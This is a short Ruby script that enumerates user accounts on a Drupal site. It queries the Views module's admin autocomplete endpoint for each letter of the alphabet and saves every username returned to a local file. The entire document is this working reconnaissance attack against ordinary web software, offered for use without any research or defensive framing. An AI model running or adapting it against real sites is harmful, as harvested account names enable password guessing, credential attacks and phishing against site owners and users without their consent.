#!/usr/bin/env ruby

require 'httparty'
require 'json'

output_file = File.new('drupalusers','a+')

if ARGV.length < 1
  puts "format is drupalusers.rb <domain>"
end

domain = ARGV[0]
url = 'http://' + domain + '/?q=admin/views/ajax/autocomplete/user/'
all_users = Array.new

('a'..'z').each do |letter|
	response = HTTParty.get(url + letter)
	users = JSON.parse(response.body)
	users.each {|name, value| all_users << value}
end

all_users.uniq.each {|user| output_file.puts user}